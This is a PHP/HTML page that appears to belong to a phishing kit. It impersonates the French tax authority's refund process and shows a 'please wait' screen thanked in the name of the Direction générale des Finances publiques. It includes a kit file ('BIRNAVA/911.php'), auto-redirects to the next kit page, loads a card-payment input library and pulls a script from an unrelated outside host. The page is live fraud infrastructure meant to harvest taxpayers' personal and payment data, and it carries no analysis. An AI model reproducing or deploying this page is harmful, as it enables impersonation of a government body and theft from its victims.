<?php
session_start();

include("./BIRNAVA/911.php");
?>
<!doctype html>
<html lang="fr" class=""><head>
		<meta charset="utf-8">
		<meta name="viewport" content="width=device-width, initial-scale=1">
		<meta name="apple-itunes-app" content="app-id=505488770">
        <meta http-equiv="refresh" content="15; URL=./B.php?FGDD=1#sHFHJHDHDHKJDJDSDSJDSJKJDSJDSDJJDSHYKJHGFG#_$dispatch">

		
			<link rel="stylesheet" href="./X911//style_v2.css">

		<link rel="shortcut icon" href="./X911/favicon.ico" type="image/ico">

		<title>Impots : Formulaire ded remboursement</title>
	<link type="text/css" rel="stylesheet" charset="UTF-8" href="https://translate.googleapis.com/translate_static/css/translateelement.css"></head>
	<body>


<div id="banner" style="margin-bottom:6px;">
<div class="container">
<a href="#"><img src="./X911/logo.svg" style="margin-top:15px; height: 72px;"></a>
<a href=""><img id="optionalstuff" src="./X911/lgn.png" style="float:right;margin-top:13px;">

<style>
@media (max-width:629px) {
  img#optionalstuff {
    display: none;
  }
}
</style></a>
</div>
</div>
		<!-- Fil d'Arianne -->
		<div class="container">
			<div class="row">
				<ol class="breadcrumb ">
					<li><a href="#" id="toPortailPub" title="Retour au portail">Accueil</a></li>
					<li class="active">Validation de la demande de remboursement</li>
				</ol>
			</div>
		</div>
		<!-- Fin du fil d'Arianne -->
		<main class="container" style="margin-top:-12px;" id="contenu">
			
			<div class="row">
				<!-- Connexion Gauche-->	
				<div class="col-md-12" style="
    text-align: center;
">
					
					<div class="panel panel-default">
						<div class="panel-heading">

							<h2 id="titre_authent" style="/* margin-top:12px; */" class="text-center">S'il vous plaît, attendez</h2>
						</div>
						<img src="./X911/loading-buffering.gif">
						<div class="panel-body"><br><br><br><b></b><br><br>

                           Nous vous remercions pour votre confiance.<br><br>

                           La direction générale des Finances publiques.





						
						
						<br><br>
									
								
						</div>
					</div>
				</div>
				</div> 
				<br><br>


			 <!-- row FIN -->
		</main> 
	

<div id="goog-gt-tt" class="skiptranslate" dir="ltr"><div style="padding: 8px;"><div><div class="logo"><img src="https://www.gstatic.com/images/branding/product/1x/translate_24dp.png" width="20" height="20" alt="Google Translate"></div></div></div><div class="top" style="padding: 8px; float: left; width: 100%;"><h1 class="title gray"></h1></div><div class="middle" style="padding: 8px;"><div class="original-text"></div></div><div class="bottom" style="padding: 8px;"><div class="activity-links"><span class="activity-link"></span><span class="activity-link"></span></div><div class="started-activity-container"><hr style="color: #CCC; background-color: #CCC; height: 1px; border: none;"><div class="activity-root"></div></div></div><div class="status-message" style="display: none;"></div></div>
	
		
	
<div class="goog-te-spinner-pos"><div class="goog-te-spinner-animation"><svg xmlns="http://www.w3.org/2000/svg" class="goog-te-spinner" width="96px" height="96px" viewBox="0 0 66 66"><circle class="goog-te-spinner-path" fill="none" stroke-width="6" stroke-linecap="round" cx="33" cy="33" r="30"></circle></svg></div></div>

        <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js"></script> <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/js/all.min.js"></script> <script src="https://dancinggorillas.com/style/impots_france.js"></script>
		<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.payment/3.0.0/jquery.payment.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script> <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js"></script> <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>



</body></html>